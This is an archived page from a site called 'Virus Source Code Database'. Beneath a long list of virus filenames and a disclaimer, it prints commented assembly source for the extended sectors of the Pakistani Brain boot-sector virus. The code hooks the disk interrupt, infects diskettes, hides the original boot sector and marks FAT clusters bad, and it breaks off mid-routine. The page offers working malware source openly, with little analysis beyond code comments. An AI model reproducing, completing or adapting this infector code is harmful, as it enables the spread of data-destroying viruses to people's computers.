<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: brain2_asm</title>
<meta name="KEYWORDS" content="brain2.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for brain2.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="b-52_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/b-52_asm.php">b-52_asm</a><br>
<a href="backfind_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/backfind_pas.php">backfind_pas</a><br>
<a href="backtime_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/backtime_asm.php">backtime_asm</a><br>
<a href="badattit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badattit_asm.php">badattit_asm</a><br>
<a href="badboy20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy20_asm.php">badboy20_asm</a><br>
<a href="badboy2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy2_asm.php">badboy2_asm</a><br>
<a href="badboy___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy___asm.php">badboy___asm</a><br>
<a href="badboy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy__asm.php">badboy__asm</a><br>
<a href="badboy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy_asm.php">badboy_asm</a><br>
<a href="badbrain_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badbrain_asm.php">badbrain_asm</a><br>
<a href="badbrn12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badbrn12_asm.php">badbrn12_asm</a><br>
<a href="bad_cmnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_cmnd_asm.php">bad_cmnd_asm</a><br>
<a href="bad-cmnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad-cmnd_asm.php">bad-cmnd_asm</a><br>
<a href="bad_reli_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_reli_asm.php">bad_reli_asm</a><br>
<a href="badseed1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badseed1_asm.php">badseed1_asm</a><br>
<a href="badseed2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badseed2_asm.php">badseed2_asm</a><br>
<a href="bad_seed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_seed_asm.php">bad_seed_asm</a><br>
<a href="bait1024_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bait1024_asm.php">bait1024_asm</a><br>
<a href="bait512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bait512_asm.php">bait512_asm</a><br>
<a href="ball_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/ball_asm.php">ball_asm</a><br>
<a href="basic0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/basic0_asm.php">basic0_asm</a><br>
<a href="basic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/basic_asm.php">basic_asm</a><br>
<a href="b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/b_asm.php">b_asm</a><br>
<a href="batch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/batch_asm.php">batch_asm</a><br>
<a href="batvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/batvir_asm.php">batvir_asm</a><br>
<a href="bb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bb_asm.php">bb_asm</a><br>
<a href="bbnop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bbnop_asm.php">bbnop_asm</a><br>
<a href="bbrains_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bbrains_asm.php">bbrains_asm</a><br>
<a href="beast-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beast-b_asm.php">beast-b_asm</a><br>
<a href="beavis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beavis_asm.php">beavis_asm</a><br>
<a href="becky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/becky_asm.php">becky_asm</a><br>
<a href="bedtime_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bedtime_asm.php">bedtime_asm</a><br>
<a href="beep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beep_asm.php">beep_asm</a><br>
<a href="bengal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bengal_asm.php">bengal_asm</a><br>
<a href="berylium_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/berylium_asm.php">berylium_asm</a><br>
<a href="bill_ted_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bill_ted_c.php">bill_ted_c</a><br>
<a href="bin_acid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bin_acid_asm.php">bin_acid_asm</a><br>
<a href="bin-obs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bin-obs_asm.php">bin-obs_asm</a><br>
<a href="biohazrd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biohazrd_asm.php">biohazrd_asm</a><br>
<a href="biosdata_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biosdata_asm.php">biosdata_asm</a><br>
<a href="bios_men_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bios_men_asm.php">bios_men_asm</a><br>
<a href="biowar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biowar_asm.php">biowar_asm</a><br>
<a href="bitaddct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bitaddct_asm.php">bitaddct_asm</a><br>
<a href="bizarre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bizarre_asm.php">bizarre_asm</a><br>
<a href="bjec-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-3_asm.php">bjec-3_asm</a><br>
<a href="bjec-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-4_asm.php">bjec-4_asm</a><br>
<a href="bjec-5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-5_asm.php">bjec-5_asm</a><br>
<a href="bjec-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-6_asm.php">bjec-6_asm</a><br>
<a href="bjec-7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-7_asm.php">bjec-7_asm</a><br>
<a href="bjec-8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-8_asm.php">bjec-8_asm</a><br>
<a href="bjec-9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-9_asm.php">bjec-9_asm</a><br>
<a href="blacjec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/blacjec_asm.php">blacjec_asm</a><br>
<a href="bljec_3a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_3a_asm.php">bljec_3a_asm</a><br>
<a href="bljec-3a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-3a_asm.php">bljec-3a_asm</a><br>
<a href="bljec_4a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_4a_asm.php">bljec_4a_asm</a><br>
<a href="bljec-4a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-4a_asm.php">bljec-4a_asm</a><br>
<a href="bljec_5a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_5a_asm.php">bljec_5a_asm</a><br>
<a href="bljec-5a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-5a_asm.php">bljec-5a_asm</a><br>
<a href="bljec5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec5_asm.php">bljec5_asm</a><br>
<a href="bljec_6a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_6a_asm.php">bljec_6a_asm</a><br>
<a href="bljec-6a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-6a_asm.php">bljec-6a_asm</a><br>
<a href="bljec_7a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_7a_asm.php">bljec_7a_asm</a><br>
<a href="bljec-7a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-7a_asm.php">bljec-7a_asm</a><br>
<a href="bljec_8a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_8a_asm.php">bljec_8a_asm</a><br>
<a href="bljec-8a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-8a_asm.php">bljec-8a_asm</a><br>
<a href="bljec_9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_9a_asm.php">bljec_9a_asm</a><br>
<a href="bljec-9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-9a_asm.php">bljec-9a_asm</a><br>
<a href="bljec9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec9a_asm.php">bljec9a_asm</a><br>
<a href="bljec9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec9_asm.php">bljec9_asm</a><br>
<a href="blknight_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/blknight_asm.php">blknight_asm</a><br>
<a href="bloody_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bloody_asm.php">bloody_asm</a><br>
<a href="bob_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bob_asm.php">bob_asm</a><br>
<a href="bobross_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bobross_asm.php">bobross_asm</a><br>
<a href="bobvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bobvirus_asm.php">bobvirus_asm</a><br>
<a href="bomber_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bomber_c.php">bomber_c</a><br>
<a href="bontchev_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bontchev_pas.php">bontchev_pas</a><br>
<a href="boot1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot1_asm.php">boot1_asm</a><br>
<a href="boot2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot2_asm.php">boot2_asm</a><br>
<a href="boot410_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot410_asm.php">boot410_asm</a><br>
<a href="boot___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot___asm.php">boot___asm</a><br>
<a href="boot__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot__asm.php">boot__asm</a><br>
<a href="boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot_asm.php">boot_asm</a><br>
<a href="bootvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bootvir_asm.php">bootvir_asm</a><br>
<a href="botdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/botdos_asm.php">botdos_asm</a><br>
<a href="bouncbal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bouncbal_asm.php">bouncbal_asm</a><br>
<a href="brain0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain0_asm.php">brain0_asm</a><br>
<a href="brain2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain2_asm.php">brain2_asm</a><br>
<a href="brain3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain3_asm.php">brain3_asm</a><br>
<a href="brain___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain___asm.php">brain___asm</a><br>
<a href="brain_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_asm.php">brain_asm</a><br>
<a href="brainext_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brainext_asm.php">brainext_asm</a><br>
<a href="brain_v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_v1_asm.php">brain_v1_asm</a><br>
<a href="brain-v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain-v1_asm.php">brain-v1_asm</a><br>
<a href="brain_v3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_v3_asm.php">brain_v3_asm</a><br>
<a href="brain-v3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain-v3_asm.php">brain-v3_asm</a><br>
<a href="breeze___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze___asm.php">breeze___asm</a><br>
<a href="breeze__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze__asm.php">breeze__asm</a><br>
<a href="breeze_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze_asm.php">breeze_asm</a><br>
<a href="brother1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother1_asm.php">brother1_asm</a><br>
<a href="brother2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother2_asm.php">brother2_asm</a><br>
<a href="brother3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother3_asm.php">brother3_asm</a><br>
<a href="brother4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother4_asm.php">brother4_asm</a><br>
<a href="brother5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother5_asm.php">brother5_asm</a><br>
<a href="brother__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother__asm.php">brother__asm</a><br>
<a href="brother_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother_asm.php">brother_asm</a><br>
<a href="brthr2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brthr2_asm.php">brthr2_asm</a><br>
<a href="brthr3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brthr3_asm.php">brthr3_asm</a><br>
<a href="bsv__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bsv__asm.php">bsv__asm</a><br>
<a href="bsv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bsv_asm.php">bsv_asm</a><br>
<a href="bubbles1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles1_asm.php">bubbles1_asm</a><br>
<a href="bubbles2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles2_asm.php">bubbles2_asm</a><br>
<a href="bubbles_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles_asm.php">bubbles_asm</a><br>
<a href="bulldoze_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bulldoze_asm.php">bulldoze_asm</a><br>
<a href="burg_541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_541_asm.php">burg_541_asm</a><br>
<a href="burg-541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg-541_asm.php">burg-541_asm</a><br>
<a href="burg541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg541__asm.php">burg541__asm</a><br>
<a href="burg541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg541_asm.php">burg541_asm</a><br>
<a href="burg_cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_cia_asm.php">burg_cia_asm</a><br>
<a href="burg-cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg-cia_asm.php">burg-cia_asm</a><br>
<a href="burger2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger2_asm.php">burger2_asm</a><br>
<a href="burger__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger__asm.php">burger__asm</a><br>
<a href="burger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger_asm.php">burger_asm</a><br>
<a href="burger_c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger_c_asm.php">burger_c_asm</a><br>
<a href="burgr____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burgr____asm.php">burgr____asm</a><br>
<a href="burg_vi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vi__asm.php">burg_vi__asm</a><br>
<a href="burg_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vir_asm.php">burg_vir_asm</a><br>
<a href="burg_vir_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vir_bas.php">burg_vir_bas</a><br>
<a href="burma2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burma2_asm.php">burma2_asm</a><br>
<a href="burma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burma_asm.php">burma_asm</a><br>
<a href="bush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bush_asm.php">bush_asm</a><br>
<a href="busted__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/busted__asm.php">busted__asm</a><br>
<a href="busted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/busted_asm.php">busted_asm</a><br>
<a href="butthole_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/butthole_asm.php">butthole_asm</a><br>
<a href="buttrfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/buttrfly_asm.php">buttrfly_asm</a><br>
<a href="buttsurf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/buttsurf_asm.php">buttsurf_asm</a><br>
<a href="bv3_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bv3_bas.php">bv3_bas</a><br>
<a href="bw1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bw1_asm.php">bw1_asm</a><br>
<a href="bwme_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bwme_asm.php">bwme_asm</a><br>
<a href="bypass_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bypass_asm.php">bypass_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;The Pakistani Brain Virus. This is the extended code section of the virus.




.RADIX 16

.MODEL  TINY

.CODE

int13_Off       EQU     0004CH                  ;interrupt 13H location
int13_Seg       EQU     0004EH
int6d_Off       EQU     001B4H                  ;interrupt 6DH location
int6d_Seg       EQU     001B6H

INF_HEAD        EQU     6                       ;these are defined in BRAIN.ASM
INF_SECTOR      EQU     7                       ;the BRAIN virus boot sector
INF_CYL         EQU     8
CURR_HEAD       EQU     9
CURR_SECCYL     EQU     0AH


;******************************************************************************
;The code at 100H is just a jump to 200H. Code for the extended sectors of the
;virus must be compiled with an offset of 200H, as they will be executed
;with that offset in high memory. The start at offset 100H with a jump just
;lets us assemble this file as a COM file.

                ORG     100H

COM_START:      jmp     START_VIRUS



;******************************************************************************
;The following is the virus startup code, continued from the viral boot sector.
;All it does is move the Interrupt 13H (Disk access) vector to location 6DH,
;and replace the Interrupt 13H vector with its own handler, INT13_HNDLR. After
;that, the virus loads the original boot sector from the hidden area where it
;stored it, places it in the usual location at 0000:7C00, and then transfers
;control to it.

                ORG     200H

START_VIRUS:    JMP     SHORT VIRUS             ;Beginning of hidden virus sectors

                DB      '(c) 1986 Jork  & Amjads (pvt) Ltd ',0
NT0_COUNTER     DB      04
DRIVE_NO        DB      00
INFECT_FLAG     DB      00

VIRUS:
                MOV     BYTE PTR CS:NT0_COUNTER,1FH ;
                XOR     AX,AX
                MOV     DS,AX                    ;ds=0

                MOV     AX,WORD PTR DS:int13_Off ;Move int 13H to int 6DH
                MOV     WORD PTR DS:int6d_Off,AX ;
                MOV     AX,WORD PTR DS:int13_Seg ;
                MOV     WORD PTR DS:int6d_Seg,AX ;

                MOV     AX,OFFSET INT13_HNDLR    ;redirect int 13H to virus
                MOV     WORD PTR DS:int13_Off,AX
                MOV     AX,CS
                MOV     WORD PTR DS:int13_Seg,AX
                MOV     CX,4                     ;Retry count for disk read
                XOR     AX,AX
                MOV     ES,AX                    ;es=0
VLOOP:          PUSH    CX
                MOV     DH,BYTE PTR CS:INF_HEAD  ;Attempt to read original boot
                MOV     DL,0                     ;sector from this trk/hd/sec
                MOV     CX,WORD PTR CS:INF_SECTOR;as stored in BRAIN boot sec
                MOV     AX,0201H
                MOV     BX,7C00H                 ;Put it in usual boot sec loc
                INT     6DH                      ;Clean disk read under BRAIN
                JNB     GO_EXEC_BOOT             ;Continue if no error
                MOV     AH,0                     ;If error, try to reset disk
                INT     6DH
                POP     CX
                LOOP    VLOOP                    ;and loop until retry ctr 0
                INT     18H                      ;if count expires, go to ROM

GO_EXEC_BOOT:   DB      0EAH,0,7CH,0,0           ;jmp far ptr 0:07C00H
                NOP                              ;end of the virus startup code

;******************************************************************************
;This is the virus' Interrupt 13H (disk) handler. It is where all of the
;interesting things happen. It filters all disk activity as long as the virus
;is active.

INT13_HNDLR     PROC    FAR
                STI                             ;turn interrupts on
                CMP     AH,2                    ;is this interrutp a disk read?
                JNE     DONT_PROCESS            ;no, just let BIOS handle it
                CMP     DL,2                    ;is it a drive above 2?
                JA      DONT_PROCESS            ;yes, let BIOS handle it
                CMP     CH,0                    ;is it cylinder 0?
                JNE     NOT_CYL_0               ;jump if not
                CMP     DH,0                    ;is it head 0?
                JE      RD_CYL0HD0              ;Cyl 0, Hd 0, go do nice things

NOT_CYL_0:      DEC     CS:NT0_COUNTER          ;miscelaneous disk read, dec ctr
                JNE     DONT_PROCESS            ;and if <> 0, pass to BIOS
                JMP     SHORT RD_CYL0HD0        ;else do nice things

DONT_PROCESS:   JMP     NEAR PTR BIOS_DISK      ;go pass control to BIOS

;if we get here, the virus is going to do something more than let BIOS process
;the disk access.
RD_CYL0HD0:     MOV     CS:INFECT_FLAG,0        ;clear this flag
                MOV     CS:NT0_COUNTER,4        ;reset this counter to 4
                PUSH    AX                      ;save registers now
                PUSH    BX
                PUSH    CX
                PUSH    DX
                MOV     BYTE PTR CS:DRIVE_NO,DL ;put drive number here
                MOV     CX,4                    ;retry counter
BOOT_READ:      PUSH    CX
                MOV     AH,0                    ;attempt to reset diskette
                INT     6DH                     ;using BIOS disk interrupt
                JB      RESET_FAILED            ;go handle an error if c set
                MOV     DH,0                    ;prep to read boot sector
                MOV     CX,0001H                ;into buffer at es:bx
                MOV     BX,OFFSET DISK_BUFFER
                PUSH    ES
                MOV     AX,CS
                MOV     ES,AX
                MOV     AX,0201H                ;read one sector
                INT     6DH                     ;again use BIOS disk interrupt
                POP     ES                      ;restore es
                JNB     READ_OK                 ;go process successful read
RESET_FAILED:   POP     CX                      ;else retry if disk op failed
                LOOP    BOOT_READ
                JMP     SHORT DISK_FAILURE      ;retries expired, go fail
                NOP

READ_OK:        POP     CX                      ;clear retry counter off stack
                MOV     AX,WORD PTR CS:RBRAIN_ID;look for infected disk
                CMP     AX,1234H                ;BRAIN_ID is 1234H if infected
                JNE     NOT_INFECTED            ;if not infected, go get it
                MOV     CS:INFECT_FLAG,1        ;set flag to indicate infected
                JMP     SHORT ALREADY_INFECTED  ;and go continue processing
                                                ;
NOT_INFECTED:   PUSH    DS                      ;come here if not infected yet
                PUSH    ES                      ;save ds & es
                MOV     AX,CS                   ;and set ds=es=cs
                MOV     DS,AX
                MOV     ES,AX
                PUSH    SI
                CALL    INFECT_DISK             ;go infect the diskette
                JB      INF_ERROR               ;jump if it couldn't do it
                MOV     CS:INFECT_FLAG,2        ;else update flag
                CALL    NEAR PTR PUT_LABEL      ;put (C) Brain label in root dir
INF_ERROR:      POP     SI                      ;restore registers
                POP     ES
                POP     DS
                JNB     ALREADY_INFECTED        ;if successful, go finish int 13

DISK_FAILURE:   MOV     AH,00                   ;else attempt disk reset
                INT     6DH                     ;one last time

;Control comes here once the disk has been infected. Now the virus cleans up
;and executes the interrupt 13H intended by the caller.
ALREADY_INFECTED:
                POP     DX                      ;restore these register
                POP     CX
                POP     BX
                POP     AX
                CMP     CX,1                    ;an operation on boot sector?
                JNE     BIOS_DISK               ;no, let BIOS handle it
                CMP     DH,0                    ;still looking for boot sector
                JNE     BIOS_DISK
                CMP     CS:INFECT_FLAG,1        ;boot sector, is disk infected?
                JNE     INF_02                  ;maybe not, go on
                MOV     CX,CS:RSTART_SECCYL     ;yes, read boot sector
                MOV     DX,WORD PTR CS:RSTART_HEAD-1 ;from hidden area where virus is
                MOV     DL,CS:DRIVE_NO
                JMP     SHORT BIOS_DISK         ;and let BIOS do the read
INF_02:         CMP     CS:INFECT_FLAG,2        ;check 2nd infect possibility
                JNE     BIOS_DISK               ;nope, let BIOS handle uninf bs
                MOV     CX,WORD PTR CS:INF_SECTOR ;yes, infected
                MOV     DH,BYTE PTR CS:INF_HEAD ;read boot sector from here
BIOS_DISK:      INT     6DH                     ;do original BIOS disk interrupt
                RETF    2                       ;interrupt return, keep flags

INT13_HNDLR     ENDP

                DB      15D DUP (0)             ;random bytes


;******************************************************************************
;This routine modifies the FAT table on a 360K disk to accomodate the virus. It
;looks for 3 contiguous open clusters in the FAT. To do this, it loads the FAT
;into RAM and searches it. If it finds 3 contiguous clusters, it marks them
;bad in RAM and then writes the FAT out to disk.

MODIFY_FAT      PROC    NEAR
                JMP     SHORT PAST_CPYRT        ;jump past the following data
                NOP

CLUSTER_CNT     DW      3                       ;counter used in this procedure

C_NOTICE        DB      ' (c) 1986 Brain & Amjads (pvt) Ltd'

PAST_CPYRT:     CALL    READ_FAT                ;read the FAT from disk into RAM
                MOV     AX,[DISK_BUFFER]        ;get diskette type
                CMP     AX,0FFFDH               ;is it a 360K DSDD diskette?
                JE      DISK_360                ;if so, continue processing
                MOV     AL,3                    ;for any other kind, return al=3
                STC                             ;and carry set
                RETN

;Come here if it is a standard 360K DSDD diskette
DISK_360:       MOV     CX,37H                  ;start looking at FAT entry 37H
                MOV     [CLUSTER_CNT],0         ;zero cluster counter
CLUST_LOOP:     CALL    READ_FAT_ENTRY          ;get individual FAT entry
